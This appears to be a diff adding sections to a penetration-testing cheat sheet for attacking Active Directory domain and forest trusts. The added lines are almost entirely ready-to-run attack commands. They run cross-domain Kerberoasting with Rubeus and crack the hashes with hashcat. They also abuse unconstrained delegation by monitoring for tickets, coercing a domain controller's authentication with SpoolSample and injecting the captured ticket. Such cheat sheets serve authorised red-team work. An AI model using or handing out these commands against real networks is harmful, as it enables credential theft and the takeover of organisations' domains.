@@ -92,4 +92,27 @@ ldapsearch -x -H ldap://<DC_IP>:3268 -D "user@target.local" -w 'Password1' \
   -b "DC=target,DC=local" "(objectClass=trustedDomain)"
 ```
 
+# Cross Domain Kerberoasting
+```powershell
+We are in the OXSIUM.LOCAL and have Bidirectional Trust
+.\Rubeus.exe kerberoast /domain:warzone.oxsium.local /dc:192.168.0.199 /outfile:C:\Tools\hashes.txt
+
+hashcat -m 13100 kerb_hashes.txt wordlist.txt
+```
+
+# Cross Forest Unconstrained Delegation
+```powershell
+Get-ADTrust -Identity warzone.oxsium.local -Properties TrustAttributes | Select TrustAttributes
+
+NEED Privilege Users
+# UNCON-PC is now configured with unconstrained delegation on warzone.oxsium.local
+.\Rubeus.exe monitor /interval:5 
+
+# Coerce the parent domain’s DC to its own unconstrained host
+.\SpoolSample.exe WIN-MAIN-SERVER.oxsium.local UNCON-PC.warzone.oxsium.local
+OR
+dir \\UNCON-PC.warzone.oxsium.local\c$
+
+.\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
+```
 
